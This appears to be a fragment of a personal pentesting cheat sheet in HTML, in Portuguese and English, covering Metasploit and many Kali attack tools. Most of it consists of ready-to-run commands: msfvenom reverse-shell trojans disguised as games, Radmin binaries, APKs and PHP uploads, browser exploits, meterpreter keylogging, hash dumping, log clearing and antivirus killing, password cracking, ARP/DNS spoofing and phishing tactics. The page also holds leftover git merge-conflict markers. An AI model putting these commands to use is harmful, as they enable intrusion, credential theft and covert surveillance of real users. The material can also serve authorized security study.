		<li>Exploit: This module is the proof-of-concept code developed to take advantage of a particular vulnerability in a target system.</li>
		<li>Payload: This module is a malicious code intended as a part of an exploit or independently compiled to run the arbitrary commands on the target system</li>
		<li>Auxiliaries: These modules are the set of tools developed to perform scanning, sniffing, wardialing, fingerprinting, and other security assessment tasks</li>
		<li>Encoders: These modules are provided to evade the detection of antivirus, firewall, IDS/IPS, and other similar malware defenses by encoding the payload during a penetration operation</li>
		<li>No Operation or No Operation Performed (NOP): This module is an assembly language instruction often added into a shellcode to perform nothing but to cover a consistent payload space</li>
	</ul>

	<p>msfconsole:</p>
	<ul>
		<li>show auxiliary: This command will display all the auxiliary modules.</li>
		<li>show exploits: This command will get a list of all the exploits within</li>
		the framework.
		<li>show payloads: This command will retrieve a list of payloads for all platforms. However, using the same command in the context of a chosen exploit will display only compatible payloads. For instance, Windows payloads will only be displayed with the Windows-compatible exploits.</li>
		<li>show encoders: This command will print the list of available encoders.</li>
		<li>show nops: This command will display all the available NOP generators.</li>
		<li>show options: This command will display the settings and options available for the specific module.</li>
		<li>show targets: This command will help us to extract a list of target OS supported by a particular exploit module.</li>
		<li>show advanced: This command will provide you with more options to fine- tune your exploit execution.</li>
	</ul>

	<p>commands:</p>
	<pre>
check
connectip [port]
exploit = run
jobs
info module
set param [value]
set gparam [value] // global
search post/windows
	</pre>

	<h2 id="clientside">Client Side</h2>
	<pre>
msfvenom # combinacao do payload e do encoder. permite criar um arquivo codificado com um payload
msfvenom --help-formats
msfvenom -p windows/meterpreter/reverse_tcp LHOST 192.168.10.10 LPORT 1234 -f exe > jogo.exe
	</pre>

	<p>Abrir msfconsole para abrir um multi handler para aguardar a conexao do usuario.</p>
	<pre>
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.10.10
set lport 1234
	</pre>

	<p>Criando um trojan</p>
	<pre>
ls /usr/share/windows-binaries
msfvenom -p windows/meterpreter/reverse_tcp LHOST 192.168.10.10 LPORT 1234 -x radmin.exe -k -f exe > radmin2.exe
	</pre>

	<p>Comprometer um APK para Android</p>
	<pre>
msfvenom -p android/meterpreter/reverse_tcp lhost 192.168.1.107 lport 4444 R > /tmp/arquivo.apk
# configurar o mesmo payload e lport no msfconsole
	</pre>

	<p>Gerar PDF malicioso</p>
	<pre>
use exploit/windows/fileformat/adobe_pdf_embedded_exe
advanced # configurar o multi handler para aceitar varias conexoes - set exit_on_session false
	</pre>

	<p>Internet Explorer</p>
	<pre>
use exploit/windows/browser/ms14_064_ole_code_execution # criar um web server na maquina do ataquente do metepreter
set srvhost [meu ip]
set srvport 80
set uripath videos
set payload windows/meterpreter/reverse_tcp
set lhost [meu ip]
set lport 4444
jobs
kill [job pid] # evitar migration em varios processos
	</pre>

	<p>Applet Java</p>
	<pre>
use exploit/multi/browser/java_jre17_jmxbean
set payload java/meterpreter/reverse_http
	</pre>

	<h2 id="auxiliary">Módulos Auxiliares do Metasploit</h2>
	<pre>
search portscan
search auxiliary/scanner/http
search auxiliary/server/capture
	</pre>

	<p>Carregar todos os exploits focados em browser.</p>
	<pre>
use auxiliary/server/browser_autopwn   # carrega todos e executa 1 por 1
use auxiliary/server/browser_autopwn2  # permite incluir determinados modulos
set LHOST [meu ip]
set SRVHOST [meu ip]
set SRVPORT 80
set URIPATH /videos
exploit
	</pre>

	<p>Capturar hashes de senhas em dominio windows</p>
	<pre>
use auxiliary/server/capture/smb
set JOHNPWFILE senhas.txt
set SRVHOST 0.0.0.0
exploit
# Ai passar o ip para a vitima tentar acessar via smb. O msfconsole vai obter o username, domain e hash.
use exploit/windows/smb/psexec
	</pre>

	<h2 id="meterpreter">Meterpreter Avançado</h2>
	<p>Migrando o processo para persistente:</p>
	<pre>
meterpreter> migrate [pid do explorer.exe]
meterpreter> run post/windows/manage/migrate
use exploit/windows/local/bypassuac
	</pre>

	<p>Comandos avançados:</p>
	<pre>
meterpreter> clearev             # limpa rastros no windows
meterpreter> run killav          # mata antivirus
meterpreter> uictl disable mouse # desabilita mouse
meterpreter> hashdump            # senhas dos usuarios
meterpreter> keyscan_start       # inicia keylogger
meterpreter> keyscan_dump
meterpreter> keyscan_stop
meterpreter> kill [pid]
meterpreter> donwload
meterpreter> upload
	</pre>

	<h2>Links</h2>
	<ul>
		<li><a href="http://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-0166901/">Embed a Metasploit Payload in an Original .Apk File</a></li>
		<li><a href="http://www.carnal0wnage.com/papers/msf_aux_modules.pdf">Metasploit Auxiliary Modules.pdf</a></li>
	</ul>
</div>

<div>
	<h1 id="webapp">Aplicações Web</h1>

	<ul>
		<li>Zap: The OWASP Zed Attack Proxy (ZAP) is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications.</li>
		<li>Burp Suite funciona como um proxy:
			<ul>
				<li>http://localhost:8080, download CA Certificate e import para Authorities com total confiança</li>
				<li>Target // mapa do site</li>
				<li>Proxy // ligar o intercept</li>
				<li>Spider // como vai mapear o site para mostrar em target</li>
				<li>Intruder // tentar fazer alguns ataques</li>
				<li>Repeater // modificar um valor e encaminhar para o destino (sem ser em real time)</li>
				<li>Sequencer // seq de sessoes e tokens</li>
			</ul>
		</li>
		<li>CSRF (Cross Site Request Forgery): Ex.: Submete um form que altera a senha em outro site.</li>
		<li>XSS (Cross Site Scripting): Permite inserir codigo js nos input. <script src=“xxxx”></script>. beef-xss server com codigo js que deve ser passado na url da vitima.</li>
		<li>Nikto2: is a basic web server security scanner. It scans and detects the security vulnerabilities caused by server miscon guration, default and insecureles, and outdated server applications.
			<div class="code">nikto -h http://172.16.43.156 -p 80
			<br>nikto -h 127.0.0.1 -use_proxy
			</div>
		</li>
		<li>Paros Proxy: is a valuable and intensive vulnerability assessment tool. It spiders through the entire website and executes various vulnerability tests.
			<a href="http://www.i-pi.com/Training/ SecTesting/paros_user_guide.pdf">Paros User Guide.pdf</a>
		</li>
		<li>W3AF: is a feature-rich web application attack and audit framework that aims to detect and exploit web vulnerabilities. The whole application security assessment process is automated, and the framework is designed to follow three major steps: discovery, audit, and attack.</li>
		<li>WafW00f: is a very useful Python script, capable of detecting the web application firewall (WAF).</li>
		<li>WebScarab: is a powerful web application security assessment tool. It has several modes of operation, but is mainly operated through the intercept proxy. This proxy sits in between the end user's browser, and the target web application, to monitor and modify the requests and responses that are being transmitted on either side. It has a number of integrated tools, such as fuzzer, session ID analysis, spider, web services analyzer, XSS and CRLF vulnerability scanner, transcoder, and others. WebScarab is an HTTP and HTTPS proxy interceptor framework that allows the user to review and modify the requests created by the browser before they are sent to the server.</li>
	</ul>

	<h2 id="auditlogs">Audit Logs</h2>
	<p>In any application for which security is important, key events should be logged as a matter of course. At a minimum, these typically include the following:</p>
	<ul>
		<li>All events relating to the authentication functionality, such as successful and failed login, and change of password.</li>
		<li>Key transactions, such as credit card payments and funds transfers.</li>
		<li>Access attempts that are blocked by the access control mechanisms.</li>
		<li>Any requests containing known attack strings that indicate overtly mali- cious intentions.</li>
	</ul>

	<p>
		Effective audit logs typically record the time of each event, the IP address from which the request was received, and the user’s account (if authenticated). Such logs need to be strongly protected against unauthorized read or write access. An effective approach is to store audit logs on an autonomous system that accepts only update messages from the main application. In some situa- tions, logs may be flushed to write-once media to ensure their integrity in the event of a successful attack.
		<br>In many situations it is desirable to take much more immediate action, in real time, in response to attempted attacks. For example, administrators may block the IP address or user account an attacker is using. In extreme cases, they may even take the application offline while investigating the attack and taking remedial action.
		<br>Anomalous events monitored by alerting mechanisms often include the following:
	</p>
	<ul>
		<li>Usage anomalies, such as large numbers of requests being received from a single IP address or user, indicating a scripted attack.</li>
		<li>Business anomalies, such as an unusual number of funds transfers being made to or from a single bank account.</li>
		<li>Requests containing known attack strings.</li>
		<li>Requests where data that is hidden from ordinary users has been modified.</li>
	</ul>
</div>

<div>
	<h1 id="mapping">Mapping the Application</h1>
	<p>
		In any attack, your first task is to map the target application’s content and functionality to establish how it functions, how it attempts to defend itself, and what technologies it uses.
		<br>The mapping exercise begins by enumerating the application’s content and functionality in order to understand what the application does and how it behaves. Much of this functionality is easy to identify, but some of it may be hidden, requiring a degree of guesswork and luck to discover.
		<br>After a catalog of the application’s functionality has been assembled, the principal task is to closely examine every aspect of its behavior, its core secu- rity mechanisms, and the technologies being employed (on both the client and server). This will enable you to identify the key attack surface that the application exposes and hence the most interesting areas where you should target subse- quent probing to find exploitable vulnerabilities.
	</p>

	<h2 id="enumeratingcontent">Enumerating Content and Functionality</h2>
	<p>View the sitemap.xml and robots.txt file.</p>

	<h3>Web Spidering</h3>
	<p>It work by requesting a web page, parsing it for links to other content, requesting these links, and continuing recursively until no new content is discovered.
Some spidering tools designed for attacking web applications check for the robots.txt file and use all URLs within it as seeds in the spidering process.</p>

	<h3>User-Directed Spidering</h3>
	<p>
		This is a more sophisticated and controlled technique that is usually prefer- able to automated spidering. Here, the user walks through the application in the normal way using a standard browser, attempting to navigate through all the application’s functionality. As he does so, the resulting traffic is passed through a tool combining an intercepting proxy and spider, which monitors all requests and responses. The tool builds a map of the application, incorpo- rating all the URLs visited by the browser. It also parses all the application’s responses in the same way as a normal application-aware spider and updates the site map with the content and functionality it discovers. The spiders within Burp Suite and WebScarab can be used in this way.
		<br>Hack steps:
	</p>
	<ul>
		<li>Review the results of your user-directed browsing and basic brute-force exercises. Compile lists of the names of all enumerated subdirectories, file systems, and file extensions.</li>
		<li>Review these lists to identify any naming schemes in use. For example, if there are pages called AddDocument.jsp and ViewDocument.jsp, there may also be pages called EditDocument.jsp and RemoveDocument.jsp. You can often get a feel for developers’ naming habits just by reading a few examples. For example, depending on their personal style, developers may be verbose (AddANewUser.asp), succinct (AddUser.asp), use abbreviations (AddUsr.asp), or even be more cryptic (AddU.asp). Getting a feel for the naming styles in use may help you guess the precise names of content you have not already identified.</li>
		<li>Review all client-side code such as HTML and JavaScript to identify any clues about hidden server-side content. These may include HTML comments related to protected or unlinked functions, HTML forms with disabled SUBMIT elements, and the like.</li>
		<li>Search for temporary files that may have been created inadvertently by developer tools and file editors. Examples include the .DS_Store file, which contains a directory index under OS X, file.php~1, which is a temporary file created when file.php is edited, and the .tmp file extension that is used by numerous software tools.</li>
		<li>Use of Public Information: Google or Web Archive.</li>
		<li>Always check any results Nikto returns manually. You can use Burp Intruder.</li>
		<li>Identify any instances where application functionality is accessed not by requesting a specific page for that function (such as /admin/editUser.jsp) but by passing the name of a function in a parameter (such as /admin.jsp?action=editUser).</li>
		<li>By spoofi ng the User-Agent header for a popular mobile device, you may be able to access a simplifi ed user interface that behaves differently than the primary interface.</li>
		<li>Review the names of all session tokens issued by the application to identify the technologies being used.</li>
		<li>Try to identify any locations within the application that may contain clues about the internal structure and functionality of other areas.</li>
		<li>Make a note of any functionality that diverges from the standard GUI appearance, parameter naming, or navigation mechanism used within the rest of the application.</li>
	</ul>

	<h2>Fuzz analysis (robustness testing or negative testing)</h2>
	<p>Fuzz analysis is a software-testing technique used by auditors and developers to test their applications against unexpected, invalid, and random sets of data input.
	<br>Bruteforce Exploit Detector (BED) is a powerful tool designed to fuzz the plain text protocols against potential buffer over ows, format string bugs, integer over ows, DoS conditions, and so on. It automatically tests the implementation of a chosen protocol by sending different combinations of commands with problematic strings to confuse the target.</p>

	<h2>Links</h2>
	<ul>
		<li><a href="http://recon.cx/en/f/msutton-fuzzing.ppt">http://recon.cx/en/f/msutton-fuzzing.ppt</a></li>
	</ul>


	<h2 id="webappburp">Web app penetration testing with Burp Suite</h2>
	<p>Burp Suite is another popular tool that is widely preferred for auditing web applications. It comes in both free and commercial versions with variations in features. Burp Suite is a combination of several tools under a single roof that work in conjunction with each other.</p>
	<ul>
		<li>An intercepting proxy that can analyze di erent requests/responses through the browser.</li>
		<li>An application-aware spider to crawl the contents of the application.</li>
		<li>Web app scanners for identifying weakness and vulnerability.</li>
		<li>Creating and saving the workspace.</li>
		<li>Extensibility of the tool by integrating custom plugins.</li>
	</ul>

	<h2 id="jbrofuzz">JBroFuzz</h2>
	<p>Is a well-known platform to fuzzy test web applications. It supports web requests over the HTTP and HTTPS protocol.</p>
	<pre>
java -jar /usr/share/zaproxy/lib/JBroFuzz.jar
	</pre>

	<h2 id="database">Database Assessment Tools</h2>
	<ul>
		<li>
			SQLMap is an advanced and automatic SQL injection tool. Its main purpose is to scan, detect, and exploit the SQL injection aws for a given URL.
			<div class="code">
				sqlmap -u “url here” --coookie=“cookie obtido no burp"
				<br>sqlmap -u "http://192.168.0.30/mutillidae/index.php?page=view-someones-blog.php" --forms --batch --dbs
			</div>
		</li>
		<li>SQL Ninja is a popular tool used to test SQL injection vulnerabilities in Microsoft SQL servers. Databases are an integral part of web apps hence, even a single aw in it can lead to mass compromising of information. Let us see how sqlninja can be used for database penetration testing.
			SQL Ninja is a specialized tool that is developed to target those web applications that use MS-SQL Server on the backend, and are vulnerable to SQL injection flaws.
			<div class="code">sqlninja –m test</div>
		</li>
	</ul>
</div>

<div>
	<h1 id="webshells">Webshells</h1>

	<p><a href="https://github.com/stasinopoulos/commix.git">Comix is an automated All-in-One OS command injection and exploitation tool.</a></p>
	<pre>
msfvenom -p php/meterpreter/reverse_tcp lhost=[minha maquina] lport=4444-f raw > /var/www/shell.php
msfvenom -p php/meterpreter/reverse_tcp lhost=[minha maquina] lport=4444-f raw -e php/base64 > /var/www/shell.php
	</pre>

	<h2>Upload do shell.php.png</h2>
	<p>
		Intercept no Burper, mudar o arquivo para .php mas mantendo o mime-type.
		<br>Abrir no browser o arquivo php.
	</p>
</div>

<div>
	<h1 id="passwordcrack">Quebra de Senhas</h1>
	<p>Pode ser online, via força bruta, ou offline tentando quebrar o hash usando uma wordlist como a /usr/share/wordlists/rockyou.txt.gz</p>

	<h2 id="privilegeescalation">Privilege Escalation</h2>
	<p>Types of privilege escalation:</p>
	<ul>
		<li>Vertical privilege escalation: In this type, a user with lower privilege is able to access the application functions designed for the user with the highest privilege, for example, a content management system where a user is able to access the system administrator functions.</li>
		<li>Horizontal privilege escalation: This happens when a normal user is able to access functions designed for other normal users. For example, in an Internet banking application, user A is able to access the menu of user B.</li>
	</ul>

	<h2 id="crunch">Crunch</h2>
	<pre>
crunch 6 8 abcdefghijklmnopqrstuwxyz0123456789 > wordlist.txt
crunch 6 8 senha%%% 0123456789 > senhas.txt // senha000 senha001…
crunch /usr/share/charset.lst mixalpha-numeric-all-space -o mywordlist.txt
crunch 8 8 abcdefghijklmnopqrstuvwxyz | pyrit -r arquivo.cap -e "Nome_do_AP" -i - attack_passthrough
crunch /usr/share/charset.lst mixalpha-numeric-all-space | pyrit -r apt34. -e “APTO 34" -i attack_passthrough
crunch 8 20 -o output.lst -p monkey dog read ! .

# without spaces:
./crunch 6 6 \!\,\?\ -t ddddd@ -o output -p dog monkey read book fun

# with spaces:
./crunch 11 11 \!\,\?\ \ -t d,d,d,d,d,@ -p dog monkey read book fun

crunch 8 8 -f /usr/share/rainbowcrack/charset.txt mixalpha -o alphawordlist.txt
crunch 1 4 -f /usr/share/crunch/charset.lst lalpha-numeric -o wordlist.lst

crunch 12 12 -t Admin%%% -o output.txt
@ represents lowercase letters
, represents uppercase letters
% represents numbers
^ represents special characters
	</pre>

	<h2 id="hydra">Hydra</h2>
<<<<<<< HEAD
	<p>Para força bruta.</p>
=======
	<p>Para força bruta. <a href="https://www.thc.org/download.php?t=r&f=hydra-8.5.tar.gz">Download</a></p>
>>>>>>> 062a8836e1449623b0e5668b1045f26584d48afe
	<pre>
hydra -l usuario -P wordlist.txt 192.168.100.1 pop3
	</pre>

	<h3>Brute force para forms web</h3>
	<p>
		Usar o Burp interception e enviar para o Intruder e definir tipo de ataque Cluster bomb.
		<br>Em payloads definir 2. login e senha
		<br>Em grep match definir mensagem que o site exibe quando login successful ou quando nao tenha a msg de login incorreto.
	</p>
	<pre>
hydra -l admin -P wordlist.txt http://10.0.0.1
	</pre>

	<h2 id="hashcat">Hashcat</h2>
	<p>Hashcat is a free multithreaded password-cracking tool. Currently, it can be used to crack more than 80 algorithms (http://hashcat.net/hashcat/#features-algos). oclHashcat // hashcat baseado na GPU
	<br>Before you can use Hashcat, you need the dictionary containing the words. The following are several sites that provide dictionaries:</p>
	<ul>
		<li><a href="http://www.skullsecurity.org/wiki/index.php/Passwords">Password List</a></li>
		<li><a href="http://kingofdkingz99.blogspot.com.br/2013/03/password-cracking-mega-collection-of.html">Password cracking: A mega collection of password cracking word lists</a></li>
		<li><a href="http://hashcrack.blogspot.de/p/wordlist-downloads_29.html">Wordlist Downloads</a></li>
		<li><a href="http://packetstormsecurity.com/Crackers/wordlists/">Packet Storm Wordlists</a></li>
		<li><a href="http://blog.g0tmi1k.com/2011/06/dictionaries-wordlists.html">Dictionaries + Wordlists</a></li>
	</ul>
	<pre>
hashcat -m 100 test.hash rockyou.txt
	</pre>

	<h2 id="rainbowcrack">RainbowCrack</h2>
	<p>
		RainbowCrack is a tool that can be used to crack a password hash using rainbow tables.
		<br>RainbowCrack is a faster password cracking tool than John. RainbowCrack is based on the concept of using rainbow tables, a huge collection of pregenerated hashes of nearly every possible password.
		<br>Tools that must be run in sequence to make things work:
	</p>
	<ul>
		<li>rtgen: This tool is used to generate the rainbow tables.</li>
		<li>rtsort: This tool is used to sort the rainbow tables generated by rtgen.</li>
		<li>rcrack: This tool is used to look up the rainbow tables to find the hash.</li>
	</ul>
	<pre>
rtgen md5 loweralpha 1 5 0 2000 8000 testing
rcrack *.rsrs -l hash.txt
	</pre>

	<p>Rainbow tables são tabelas contendo o texto correspondente de um hash. Download raibow tables:</p>
	<ul>
		<li><a href="http://project-rainbowcrack.com/">RainbowCrack</a></li>
		<li><a href="https://hashkiller.co.uk/default.aspx">HashKiller's</a></li>
		<li><a href="http://www.sha1-online.com/">SHA1 and other hash functions online generator</a></li>
		<li><a href="http://rainbowtables.shmoo.com/">Rainbow Tables</a></li>
	</ul>

	<h2 id="samdump2">samdump2</h2>
	<p>To extract password hashes from the Windows 2K/NT/XP/Vista SAM database registry file, you can use <a href="http://sourceforge.net/projects/ ophcrack/files/samdump2/">samdump2</a>. With samdump2, you don't need to give the System Key (SysKey) rst to get the password hash. SysKey is a key used to encrypt the hashes in the Security Account Manager (SAM) le. It was introduced and enabled in Windows NT Service Pack 3.</p>
	<pre>
samdump2 system sam -o test-sam
	</pre>

	<p>There are several ways to get the Windows password hash:</p>
	<ul>
		<li>The first method is by using the samdump2 program utilizing the Windows system and SAM files. These are located in the c:\%windows%\system32\config directory. This folder is locked for all accounts if Windows is running. To overcome this problem, you need to boot up a Linux Live CD such as Kali Linux and mount the disk partition containing the Windows system. After this, you can copy the system and SAM les to your Kali machine.</li>
		<li>The second method is by using the pwdump program and its related variant tools from the Windows machine to get the password hash file.</li>
		<li>The third method is by using the hashdump command from the meterpreter script as shown in the previous chapter. To be able to use this method, you need to exploit the system and upload the meterpreter script first.</li>
	</ul>

	<h2 id="john">John the Ripper</h2>
	<p>John is a tool that can be used to crack the password hash.</p>
	<pre>
unshadow /etc/passwd /etc/shadow > hashes
john hashes
john --show pass
	</pre>

	<p>To clear up the John cache, you may want to delete the /root/.john/ john.pot file.
	<br>If you want to crack the Windows password, rst you need to extract the Windows password hashes (LM and/or NTLM) in the pwdump output format from the Windows system and SAM les. You can consult http://www.openwall.com/ passwords microsoft-windows-nt-2000-xp-2003-vista-7#pwdump to see several of these utilities. One of them is samdump2.</p>
	<pre>
john test-sam.txt --wordlist=password.lst --format=nt
	</pre>

	<h2 id="johnny">Johnny</h2>
	<p>If you nd the John command line to be daunting, you can be thankful for <a href="http://openwall.info/wiki/john/johnny">Johnny</a>. It is a graphical user interface for John.</p>


	<h2 id="ophcrack">Ophcrack</h2>
	<p>
	Ophcrack is a rainbow-tables-based password cracker that can be used to crack the Windows LM and NTLM password hashes. It comes as a command line and graphical user interface program. Just like the RainbowCrack tool, Ophcrack is based on the time-memory tradeoff method.
	<br>Before you can use Ophcrack, you need to grab the rainbow tables from the <a href="http://ophcrack.sourceforge.net/tables.php">Ophcrack site</a>.</p>
	<pre>
ophcrack-cli -d fast -t fast -f test-sam
	</pre>

	<h2 id="cewl">CeWL (Custom Word List)</h2>
<<<<<<< HEAD
	<p>The <a href="http://www.digininja.org/projects/cewl.php">CeWL</a> generator is a tool that will spider a target Uniform Resource Locator (URL) and create a unique list of the words found on that URL. This list can then be used by password cracker tools such as John the Ripper.</p>
=======
	<p>The <a href="https://digi.ninja/projects/cewl.php#download">CeWL</a> generator is a tool that will spider a target Uniform Resource Locator (URL) and create a unique list of the words found on that URL. This list can then be used by password cracker tools such as John the Ripper.</p>
>>>>>>> 062a8836e1449623b0e5668b1045f26584d48afe
	<pre>
cewl -m 5 -w words.txt [url]
	</pre>

	<h2 id="medusa">Medusa</h2>
	<p>Medusa is another online password cracker for network services. It has the characteristics of being speedy, massively parallel, and modular.</p>

	<h2 id="hashidentifier">hash-identifier</h2>
	<p>The <a href="https://code.google.com/archive/p/hash-identifier/">hash-identifier</a> tool can be used to identify a password hash type. Before you can crack a password hash, you need to determine its type in order to give the correct algorithm for the password cracker. Beware that this program may not always identify the hash correctly.</p>
</div>

<div>
	<h1 id="redirection">Redirecionamento e Spoofing</h1>
	<p>Network spoofing is a process to modify network packets, such as the MAC address and IP address. The goal of this process is to get the data from two communicating parties.</p>

	<h2 id="arpspoofing">ARP Spoofing</h2>
	<p>Habilitar ip_forwarding e abrir wireshark para capturar trafego.</p>
	<pre>
arpspoof -i eth0 -t 10.0.0.10 -r 10.0.0.15 # envenena a maquina 10 dizendo ser a maquina 15 e maquina 15 dizendo ser a 10
arpspoof -i eth0 -t 10.0.0.10 -r 10.0.0.1  # finge ser o gateway para a maquina 10
	</pre>

	<h2 id="dnsspoofing">DNS Spoofing</h2>
	<p>Colocar um site fake, salvar dados no arquivo e redirecionar.</p>
	<pre>
arpspoof -i eth0 -t 192.168.1.112 -r 192.168.1.1 // finge ser o gateway
cat > hosts.txt &lt;&lt;EOF
192.168.1.107 www.gmail.com
EOF
dnsspoof -i eht0 -f hosts.txt // utiliza o arquivo hosts.txt para resolucao de dns nos clients. Se nao especificado qualquer endereco vai apontar pra essa propria maquina.
	</pre>

	<h2 id="dnschef">DNSChef</h2>
	<p><a href="http://thesprawl.org/projects/dnschef/">DNSChef</a> is a DNS proxy; it can be used to fake a domain request to point to a local machine that belongs to the attacker instead of the real host. With this capability, an attacker can control the victim's network traf c. Before you can use DNSChef, you need to con gure the victim machine DNS server to point to your machine containing DNSChef.</p>
	<pre>
dnschef --fakeip=172.16.43.150 --fakedomains google.com --interface 172.16.43.156 -q
	</pre>

	<h2 id="arpspoof">arpspoof</h2>
	<p>The arpspoof tool is a tool that can be used to sniff the network traf c in a switch environment. This attack will work if the attacker and the victim are located in the same network.</p>
	<pre>
arpspoof -t 192.168.65.129 192.168.65.1
	</pre>

	<h2 id="ettercap">Ettercap</h2>
	<p><a href="http://ettercap.github.io/ettercap/">Ettercap</a> is a suite of tools to do a man-in-the-middle attack on LAN. It will perform attacks on the ARP protocol by positioning itself as the man in the middle. Once it achieves this, it is able to do the following:</p>
	<ul>
		<li>Modify data connections</li>
		<li>Password discovery for FTP, HTTP, POP, SSH1, and so on</li>
		<li>Provide fake SSL certificates to foil the victim's HTTPS sessions</li>
	</ul>
	<pre>
ettercap -T # text
ettercap -C # curses
ettercap -G # gui
ettercap -i eth0 -T -q -P dns_spoof -M ARP /172.16.43.1/ /172.16.43.156/
ettercap -Tq # mostra somente as capturas
ettercap -T -i eth0 -M dhcp:192.168.1.150-160/255.255.255.0/8.8.8.8
# tecla p para plugins. tem plugin dns spoof.
	</pre>

	<p>Usar ARP é mais rápido do que DHCP pois DHCP somente quando a maquina ainda nao tem IP.</p>
	<pre>
ettercap -Tq -i eth0 -M arp:remote /192.168.1.1// /192.168.1.109-115 # envenena as maquinas 109 a 115
ettercap -Tq -i eth0 -M arp:remote /192.168.1.1// ///                # envenena todas maquinas
	</pre>

	<h2 id="mim">Men in the middle remote</h2>
	<p>
		Usar engenharia social para fazer a vitima configurar o proxy no browser.
		<br>Criar um .bat/.exe para adicionar o certificado via msfconsole use post/windows/manage/inject_ca
	</p>

	<h3>mitmproxy e mitmdump</h3>
	<p>
		HSTS no header para evitar ssl strip
		<br>mitmf.conf da pra configurar integracao com beef, metasploit. possui dns e dhcp poison. da pra fazer regex no response e substituir strings. configurar o sslstrip+
	</p>
	<pre>
mitmf --hsts --arp --spoof -i eth0 --target 192.168.1.109 --gateway 192.168.1.1
	</pre>
</div>

<div>
	<h1 id="socialengineering">Engenharia Social</h1>
	<p>
		In the real world, two common tactics are applied to accomplish this task: interview and interrogation.
		<br>However, in practice, each tactic includes other factors such as environment, knowledge of the target, and the ability to control the frame of communication. These combined factors (communication, environment, knowledge, and frame control) construct the basic set of skills used by an effective social engineer to draw attention towards the goals and vision of a social engineering attack. All social engineering activity relies on a relationship of trust.
		<br>If you cannot build a strong trust relationship with your target, then you will most likely fail in your endeavor.
	</p>
	<p>common steps:</p>
	<ul>
		<li>Intelligence gathering: There are many techniques to determine the most attractive target for your penetration test. This can be done by harvesting corporate e-mail addresses across the Web using advanced search engine tools, collecting personal information about people working for the target organization through online social networks, identifying third-party software packages used by the target organization, getting involved in corporate business events and parties, and attending conferences.</li>
		<li>Identifying vulnerable points: Once a key insider has been selected, one can move forward to establish a trusting relationship and show friendliness. This would ensure that an attempt to hijack any confidential corporate information would not harm or alert the target. Maintaining a high level of covertness and concealment during the whole process is important. Alternatively, we can also investigate to find out if the target organization is using older versions of its software, which can be exploited by delivering malicious content via an e-mail or the Web, which can, in turn, infect the trusted party's computer.</li>
		<li>Planning the attack: It's your choice whether you plan to attack the target directly or by passively using electronic-assisted technology. Based on the identified vulnerable entry points, we could easily determine the path and method of an attack. For instance, we found a friendly customer service representative, Bob, who would unwittingly execute any malicious files from his e-mail without any prior authorization from the senior management.</li>
		<li>Execution: During the final step, our planned attack should be executed with confidence and patience to monitor and assess the results of the target exploitation. At this point, social engineers should hold enough information or access to the target's property, which would allow them to further penetrate the corporate assets. On successful execution, the exploitation and acquisition process is completed.</li>
	</ul>

	<h2 id="phising">Phising</h2>
	<p>É uma mensagem enganosa.</p>
	<ul>
		<li><a href="https://emkei.cz/">Emkei's Mailer</a> para fake mail</li>
		<li><a href="http://www.ex-parrot.com/~chris/driftnet/">driftnet</a> para capturar imagens de trafego na rede</li>
	</ul>

	<h2 id="attackmethods">Attack Methods</h2>
	<ul>
		<li>Impersonation: Attackers will pretend to be someone else in order to gain trust. For instance, to acquire the target's bank information, phishing would be the perfect solution unless the target has no e-mail account. Hence, the attacker rst collects or harvests e-mail addresses from the target, and then prepares a scam page that looks and functions exactly like the original bank web interface.</li>
		<li>Reciprocation: The act of exchanging a favor in terms of gaining mutual advantage is known as reciprocation. This type of social engineering engagement may involve a casual and long-term business relationship. By exploiting the trust between business entities, someone could easily map their target to acquire any necessary information.</li>
		<li>Influential authority: An attack method by which one manipulates the target's business responsibilities is known as an in uential authority attack. This kind of social engineering attack is sometimes part of an impersonation method. Humans, by nature, act in an automated fashion to accept instructions from their authority or senior management, even if their instincts suggest that certain instructions should not be followed.</li>
		<li>Scarcity: Taking the best opportunity, especially if it seems scarce, is one of the greediest habits of human beings. This method describes a way of giving an opportunity to people for their personal gain. <a href="http://www.419eater.com/scamtracker/">http://www.419eater.com/scamtracker/</a></li>
		<li>Social relationship: We require some form of social relationship to share our thoughts, feelings, and ideas. The most vulnerable part of any social connection is sexuality.</li>
		<li>Idea: Social fake profile</li>
		<li>Curiosity: There is an old saying: curiosity killed the cat. It is an admonishment to humans that sometimes our own curiosity gets the better of us. At work, there is a great deal of curiosity at play. We want to know how much the CEO gets paid, who is going to get promoted, or who is going to be let go.</li>
	</ul>

	<h2 id="set">Social Engineering Toolkit (SET)</h2>
	<p>The Social Engineering Toolkit (SET) is an advanced, multifunctional, and easy-to-use computer-assisted social engineering toolset.</p>
	<ul>
		<li>Anonymous USB Attack: During this attack, we are going to craft an executable that will open a reverse connection between the target machine and our testing machine. To deliver this executable, we are going to place it on a USB device with a name that will peak
		the curiosity of the target.</li>
		<li>Tabnabbling</li>
		<li>QRCode generator para baixar um apk malicioso</li>
		<li>Infectious Media</li>
		<li>Standard Metasploit Executable</li>
		<li>Windows reverse TCP Meterpreter PORT reverse listener: 4444</li>
	</ul>

	<h2>Links</h2>
	<ul>
		<li><a href="https://www.youtube.com/watch?v=C07GB9acxI4">Video: A arte de Enganar com a Engenharia Social</a></li>
	</ul>
</div>

<div>
	<h1 id="ids">Burlando IDS, Firewall e Antivirus</h1>
	<ul>
		<li>Usando metasploit: set payload windows/meterpreter/reverse_tcp_allports</li>
		<li><a href="https://virustotal.com/">VirusTotal</a> é um serviço gratuito que analisa arquivos e URLS suspeitas e facilita a rápida detecção de vírus, worms, cavalos de tróia e todos os tipos de arquivos maliciosos.</li>
		<li>O ideal é criar seu proprio backdoor com alguma linguagem de programacao.</li>
		<li><a href="http://www.heaventools.com/overview.htm">Haven Tools PE Explorer</a>: View, Edit, and Reverse Engineer EXE and DLL Files. Adiciona payload num .exe</li>
		<li><a href="https://github.com/Veil-Framework/Veil">Veil Evasion</a>: Criptografa um backdoor ja existente ou cria um backdoor para o antivirus nao identificar. Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.</li>
		<li>Codificadores: hyperion e pe_scrambler</li>
	</ul>
</div>

<div>
	<h1 id="wireless">Wireless</h1>
	<p>Modo de monitoramento permite capturar trafego de todas as redes ao alcance sem precisar conectar nelas.</p>
	<pre>
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon # mostra todas as redes disponiveis
	</pre>

	<h2 id="macchanger">macchanger</h2>
	<pre>
macchanger —mac=[mac] wlan0
ifconfig wlan0 up
	</pre>

